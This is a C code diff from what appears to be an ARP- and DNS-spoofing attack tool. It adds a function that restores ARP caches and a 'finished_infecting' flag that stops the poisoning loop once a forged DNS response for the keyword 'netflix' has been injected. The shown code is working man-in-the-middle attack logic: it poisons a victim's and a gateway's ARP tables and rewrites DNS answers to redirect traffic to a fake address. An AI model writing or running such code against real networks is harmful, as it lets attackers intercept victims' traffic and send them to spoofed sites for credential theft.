@@ -4,9 +4,39 @@
 #include "spoof.h"
 
 extern send_params infect_params;
+BOOL finished_infecting = 0;
 static char* keyword = "netflix";
 u_long fake_web = 1111; // TODO 
 
+void stop_arp_spoofing()
+{
+	int pack_size = sizeof(ether_hdr) + sizeof(arp_ether_ipv4);
+
+	u_char victim_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
+	u_char gateway_packet[sizeof(ether_hdr) + sizeof(arp_ether_ipv4)];
+
+	/* build the packets */
+	build_packet(
+		victim_packet,
+		htonl(infect_params.gateway_ip),
+		htonl(infect_params.victim_ip),
+		infect_params.gateway_mac,
+		infect_params.victim_mac,
+		2
+	);
+
+	build_packet(
+		gateway_packet,
+		htonl(infect_params.victim_ip),
+		htonl(infect_params.gateway_ip),
+		infect_params.victim_mac,
+		infect_params.gateway_mac,
+		2
+	);
+
+	pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
+	pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
+}
 
 DWORD WINAPI start_arp_spoofing(LPVOID lparam)
 {
@@ -34,8 +64,7 @@ DWORD WINAPI start_arp_spoofing(LPVOID lparam)
 		2
 	);
 
-	int condition = 1;
-	while (condition)
+	while (!finished_infecting)
 	{
 		pcap_sendpacket(infect_params.fp, victim_packet, pack_size);
 		pcap_sendpacket(infect_params.fp, gateway_packet, pack_size);
@@ -140,11 +169,13 @@ size_t dns_spoofing(u_char* packet, size_t packet_size)
 	}
 
 	if (matching_found)
+	{
+		/* create fake dns packet */
 		temp_p = create_fake_dns_respones(dns_header, dns_data, temp_p);
-	
-	/* change udp/ip header length fields */
-	change_packet_sizes(packet, temp_p);
-
+		/* change udp/ip header length fields */
+		change_packet_sizes(packet, temp_p);
+		finished_infecting = 1;
+	}
 	
 	return (BYTE*)temp_p - packet;
 }
